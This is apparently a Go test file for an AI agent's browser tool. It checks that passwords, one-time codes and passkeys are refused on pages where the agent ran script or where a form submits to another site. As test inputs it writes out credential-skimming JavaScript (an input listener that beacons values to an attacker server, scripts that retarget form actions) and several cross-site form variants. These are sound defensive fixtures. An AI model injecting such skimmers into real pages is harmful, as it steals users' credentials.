package browser

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"strings"
	"sync"
	"testing"
	"time"
)

// What the agent's own script does to a page before a sign-in, against a
// real Chrome (see TestARealChromeFillsASecretAndSignsWithAPasskey for how to
// start one):
//
//	TEANODE_TEST_CHROME=http://127.0.0.1:19222 go test ./internal/browser/

// realChromePage is a page of a real Chrome on a test site, with a second
// server that stands for a site the secret must not reach.
type realChromePage struct {
	test *testing.T
	ctx  context.Context
	page *Context
	// siteAddress and attackerAddress are the two servers, both on
	// "localhost" with different ports (which makes them different sites).
	siteAddress     string
	attackerAddress string

	mutex    sync.Mutex
	received []string
}

// receivedText is everything the second server was sent, as one text.
func (self *realChromePage) receivedText() string {
	self.mutex.Lock()
	defer self.mutex.Unlock()
	return strings.Join(self.received, "\n")
}

// startRealChromePage serves the page siteHTML(attackerAddress) on one server,
// collects everything sent to another, and opens a page of Chrome on the first.
func startRealChromePage(test *testing.T, siteHTML func(attackerAddress string) string) *realChromePage {
	test.Helper()
	endpoint := os.Getenv("TEANODE_TEST_CHROME")
	if endpoint == "" {
		test.Skip("set TEANODE_TEST_CHROME to a DevTools endpoint to run this")
	}
	found := &realChromePage{test: test}
	attacker := httptest.NewServer(http.HandlerFunc(func(response http.ResponseWriter, request *http.Request) {
		body, _ := io.ReadAll(request.Body)
		found.mutex.Lock()
		found.received = append(found.received, request.Method+" "+request.URL.String()+" body="+string(body))
		found.mutex.Unlock()
		response.Header().Set("Content-Type", "text/html")
		_, _ = fmt.Fprint(response, "<html>thanks</html>")
	}))
	test.Cleanup(attacker.Close)
	found.attackerAddress = strings.Replace(attacker.URL, "127.0.0.1", "localhost", 1)
	site := httptest.NewServer(http.HandlerFunc(func(response http.ResponseWriter, _ *http.Request) {
		response.Header().Set("Content-Type", "text/html")
		_, _ = fmt.Fprint(response, siteHTML(found.attackerAddress))
	}))
	test.Cleanup(site.Close)
	found.siteAddress = strings.Replace(site.URL, "127.0.0.1", "localhost", 1)

	ctx, cancel := context.WithTimeout(context.Background(), 90*time.Second)
	test.Cleanup(cancel)
	found.ctx = ctx
	browser, err := Connect(ctx, &Settings{Endpoint: endpoint, AllowPrivate: []string{"localhost"}, ProxyListen: "127.0.0.1:0"})
	if err != nil {
		test.Fatal(err)
	}
	test.Cleanup(func() { _ = browser.Close() })
	browser.guard = func(string) error { return nil }
	if found.page, err = browser.NewContext(ctx); err != nil {
		test.Fatal(err)
	}
	test.Cleanup(func() { _ = found.page.Close() })
	if _, err := found.page.Navigate(ctx, found.siteAddress); err != nil {
		test.Fatal(err)
	}
	return found
}

// refOf is the ref of the first line of the interactive snapshot that has the
// description in it.
func (self *realChromePage) refOf(description string) int {
	self.test.Helper()
	snapshot, err := self.page.Snapshot(self.ctx, "interactive", 0)
	if err != nil {
		self.test.Fatal(err)
	}
	for _, line := range strings.Split(snapshot.Text, "\n") {
		var ref int
		if strings.Contains(line, description) {
			if _, err := fmt.Sscanf(strings.TrimSpace(line), "[ref=%d]", &ref); err == nil {
				return ref
			}
		}
	}
	self.test.Fatalf("no %s in %s", description, snapshot.Text)
	return 0
}

// port is the port the test site is on.
func (self *realChromePage) port() int {
	var port int
	_, _ = fmt.Sscanf(self.siteAddress[strings.LastIndex(self.siteAddress, ":")+1:], "%d", &port)
	return port
}

func (self *realChromePage) fill(ref int, kind FieldKind, text string) error {
	return self.page.FillSecret(self.ctx, FillRequest{Ref: ref, Host: "localhost", Port: self.port(), Kind: kind, Text: text})
}

// submitAndSettle clicks the sign-in button and waits for a request to land.
func (self *realChromePage) submitAndSettle() {
	self.test.Helper()
	if _, _, err := self.page.Click(self.ctx, Target{Ref: self.refOf(`"Sign in"`)}); err != nil {
		self.test.Fatalf("click: %s", err)
	}
	time.Sleep(1500 * time.Millisecond)
}

const scriptTestForm = `<html><body><form action="/login" method="post">
<input id="user" name="user" autocomplete="username"><input id="secret" name="secret" type="password"><input id="code" name="code" autocomplete="one-time-code">
<button type="submit" id="go">Sign in</button></form></body></html>`

// A listener or a changed form that the agent's script left in the page is
// there when the sign-in types, and a click then sends the value to the
// attacker. The page is not filled; a new document is, and nothing leaks.
func TestARealChromeDoesNotFillAPageTheAgentRanScriptIn(test *testing.T) {
	const secret = "an-invented-password-9"
	const code = "718293"
	for name, script := range map[string]func(attackerAddress string) string{
		"a listener that sends every value out": func(attackerAddress string) string {
			return `document.addEventListener('input', function(event){ new Image().src='` + attackerAddress + `/beacon?p='+encodeURIComponent(event.target.value); }, true); 'ok'`
		},
		"a form pointed at another site": func(attackerAddress string) string {
			return `document.querySelector('form').action='` + attackerAddress + `/collect'; 'ok'`
		},
		"a button pointed at another site": func(attackerAddress string) string {
			return `document.getElementById('go').setAttribute('formaction', '` + attackerAddress + `/collect'); 'ok'`
		},
	} {
		for kind, fieldID := range map[FieldKind]string{FieldKindPassword: `input(password) "secret"`, FieldKindOneTimeCode: `"code"`} {
			test.Run(fmt.Sprintf("%s, a %s", name, kind), func(test *testing.T) {
				text := secret
				if kind == FieldKindOneTimeCode {
					text = code
				}
				found := startRealChromePage(test, func(string) string { return scriptTestForm })
				if _, err := found.page.Evaluate(found.ctx, script(found.attackerAddress), 100); err != nil {
					test.Fatalf("a script before any fill was refused: %s", err)
				}
				err := found.fill(found.refOf(fieldID), kind, text)
				if err == nil || !strings.Contains(err.Error(), ScriptedPageWords) || strings.Contains(err.Error(), text) {
					test.Fatalf("a page the agent ran script in was filled, or refused with the wrong words: %v", err)
				}
				if value, _ := found.page.Evaluate(found.ctx, `document.getElementById('secret').value + document.getElementById('code').value`, 100); strings.Contains(value, text) {
					test.Fatalf("the field holds %s", value)
				}
				found.submitAndSettle()
				if received := found.receivedText(); strings.Contains(received, text) {
					test.Fatalf("the attacker received the value: %s", received)
				}

				// The sign-in page opened again is a new document without the
				// script: it is filled, and the value goes to the site.
				if _, err := found.page.Navigate(found.ctx, found.siteAddress); err != nil {
					test.Fatal(err)
				}
				if err := found.fill(found.refOf(fieldID), kind, text); err != nil {
					test.Fatalf("a new document was not filled: %s", err)
				}
				found.submitAndSettle()
				if received := found.receivedText(); strings.Contains(received, text) {
					test.Fatalf("the attacker received the value after the page was opened again: %s", received)
				}
			})
		}
	}
}

// A passkey is not set up on a page the agent ran script in either: the script
// could wrap the sign-in and send what the authenticator signs.
func TestARealChromeDoesNotSetUpAPasskeyOnAPageTheAgentRanScriptIn(test *testing.T) {
	found := startRealChromePage(test, func(string) string { return scriptTestForm })
	if _, err := found.page.Evaluate(found.ctx, `1+1`, 100); err != nil {
		test.Fatal(err)
	}
	err := found.page.AddPasskey(found.ctx, Passkey{CredentialID: []byte("credential"), RelyingPartyID: "localhost", PrivateKey: []byte("key")})
	if err == nil || !strings.Contains(err.Error(), ScriptedPageWords) {
		test.Fatalf("a passkey on a scripted page: %v", err)
	}
	if found.page.HasPasskey() {
		test.Fatal("an authenticator was set up")
	}
}

// A form that sends to another site than the page is not filled, whichever
// way the address is written, and the field stays empty.
func TestARealChromeDoesNotFillAFormThatSendsToAnotherSite(test *testing.T) {
	const secret = "an-invented-password-9"
	fields := `<input id="user" name="user" autocomplete="username"><input id="secret" name="secret" type="password">`
	for name, page := range map[string]func(attackerAddress string) string{
		"the form's action": func(attackerAddress string) string {
			return `<html><body><form action="` + attackerAddress + `/collect" method="post">` + fields + `<button type="submit" id="go">Sign in</button></form></body></html>`
		},
		"a submit button's formaction": func(attackerAddress string) string {
			return `<html><body><form action="/login" method="post">` + fields + `<button type="submit" id="go" formaction="` + attackerAddress + `/collect">Sign in</button></form></body></html>`
		},
		"an image input's formaction": func(attackerAddress string) string {
			return `<html><body><form action="/login" method="post">` + fields + `<input type="image" alt="Sign in" formaction="` + attackerAddress + `/collect" src="data:image/gif;base64,R0lGODlhAQABAAAAACw="></form></body></html>`
		},
		"a button outside the form that names it": func(attackerAddress string) string {
			return `<html><body><form id="login" action="/login" method="post">` + fields + `</form><button type="submit" form="login" formaction="` + attackerAddress + `/collect">Sign in</button></body></html>`
		},
		"an action that a field named action hides from form.action": func(attackerAddress string) string {
			return `<html><body><form action="` + attackerAddress + `/collect" method="post">` + fields + `<input name="action" value="/login"><input name="elements" value="x"><button type="submit">Sign in</button></form></body></html>`
		},
		"a relative action under a base address that is another site": func(attackerAddress string) string {
			return `<html><head><base href="` + attackerAddress + `/"></head><body><form action="login" method="post">` + fields + `<button type="submit">Sign in</button></form></body></html>`
		},
	} {
		test.Run(name, func(test *testing.T) {
			found := startRealChromePage(test, page)
			err := found.fill(found.refOf(`input(password) "secret"`), FieldKindPassword, secret)
			if err == nil || !strings.Contains(err.Error(), "sends to another site") || strings.Contains(err.Error(), secret) {
				test.Fatalf("a form that sends elsewhere was filled, or refused with the wrong words: %v", err)
			}
			if err := found.fill(found.refOf(`"user"`), FieldKindUserName, "ada"); err == nil {
				test.Fatal("the user name went into a form that sends elsewhere")
			}
			if value, _ := found.page.Evaluate(found.ctx, `document.getElementById('secret').value`, 100); value != `""` {
				test.Fatalf("the field holds %s", value)
			}
		})
	}
}

// A form that sends to its own site is filled, with an action written in each
// of the ways a site writes it.
func TestARealChromeFillsAFormThatSendsToItsOwnSite(test *testing.T) {
	const secret = "an-invented-password-9"
	fields := `<input id="user" name="user" autocomplete="username"><input id="secret" name="secret" type="password">`
	for name, page := range map[string]func(attackerAddress string) string{
		"no action": func(string) string {
			return `<html><body><form>` + fields + `<button id="go">Sign in</button></form></body></html>`
		},
		"a relative one": func(string) string {
			return `<html><body><form action="/login">` + fields + `<button id="go">Sign in</button></form></body></html>`
		},
		"a button's own": func(string) string {
			return `<html><body><form>` + fields + `<button formaction="/other" id="go">Sign in</button></form></body></html>`
		},
		"no form at all": func(string) string { return `<html><body>` + fields + `</body></html>` },
		"a script address": func(string) string {
			return `<html><body><form action="javascript:void(0)">` + fields + `</form></body></html>`
		},
	} {
		test.Run(name, func(test *testing.T) {
			found := startRealChromePage(test, page)
			if err := found.fill(found.refOf(`input(password) "secret"`), FieldKindPassword, secret); err != nil {
				test.Fatal(err)
			}
			if value, _ := found.page.Evaluate(found.ctx, `document.getElementById('secret').value`, 100); value != `"`+secret+`"` {
				test.Fatalf("the field holds %s", value)
			}
		})
	}
}
